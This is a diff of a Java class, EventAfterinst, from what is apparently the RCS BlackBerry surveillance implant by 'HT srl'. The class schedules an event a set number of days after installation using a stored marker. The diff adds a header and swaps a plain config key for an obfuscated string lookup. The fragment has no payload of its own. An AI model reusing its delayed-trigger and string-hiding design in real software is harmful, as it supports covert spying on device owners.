@@ -1,10 +1,19 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2012
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+
 package blackberry.event;
 
 import java.util.Calendar;
 import java.util.Date;
 import java.util.TimeZone;
 
+import blackberry.Messages;
 import blackberry.config.ConfEvent;
 import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
@@ -14,7 +23,7 @@ import blackberry.evidence.Markup;
 public class EventAfterinst extends Event {
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("EventAfterinst", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("EventAfterinst", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private int days;
@@ -22,19 +31,19 @@ public class EventAfterinst extends Event {
 
     protected boolean parse(ConfEvent conf) {
         try {
-            days = conf.getInt("days");
+            days = conf.getInt(Messages.getString("z.0")); //$NON-NLS-1$
             Markup markup = new Markup(this);
             Date now = new Date();
             if (markup.isMarkup()) {
                 date = (Date) markup.readDate();
                 //#ifdef DEBUG
-                debug.trace("parse, reading markup: " + date);
+                debug.trace("parse, reading markup: " + date); //$NON-NLS-1$
                 //#endif
             } else {
                 date = now;
 
                 //#ifdef DEBUG
-                debug.trace("parse, writing markup: " + now);
+                debug.trace("parse, writing markup: " + now); //$NON-NLS-1$
                 //#endif
 
                 markup.write(date);
@@ -43,7 +52,7 @@ public class EventAfterinst extends Event {
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error("parse"); //$NON-NLS-1$
             //#endif
             return false;
         }
@@ -53,9 +62,9 @@ public class EventAfterinst extends Event {
     protected void actualStart() {
 
         //#ifdef DEBUG
-        debug.trace("actualStart");
+        debug.trace("actualStart"); //$NON-NLS-1$
         //#endif
-        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
+        Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT")); //$NON-NLS-1$
 
         long nowMillis = calendar.getTime().getTime();
         calendar.setTime(date);
@@ -66,7 +75,7 @@ public class EventAfterinst extends Event {
 
         if (delay > 0) {
             //#ifdef DEBUG
-            debug.trace("actualStart set delay: " + delay);
+            debug.trace("actualStart set delay: " + delay); //$NON-NLS-1$
             //#endif
 
             setDelay(delay);
@@ -75,7 +84,7 @@ public class EventAfterinst extends Event {
 
         } else {
             //#ifdef DEBUG
-            debug.trace("actualStart set soon delay");
+            debug.trace("actualStart set soon delay"); //$NON-NLS-1$
             //#endif
             setDelay(SOON);
             setPeriod(NEVER);
@@ -86,14 +95,14 @@ public class EventAfterinst extends Event {
 
     protected void actualStop() {
         //#ifdef DEBUG
-        debug.trace("actualStop");
+        debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
         onExit(); // di sicurezza
     }
 
     protected void actualLoop() {
         //#ifdef DEBUG
-        debug.trace("actualLoop");
+        debug.trace("actualLoop"); //$NON-NLS-1$
         //#endif
         onEnter();
     }
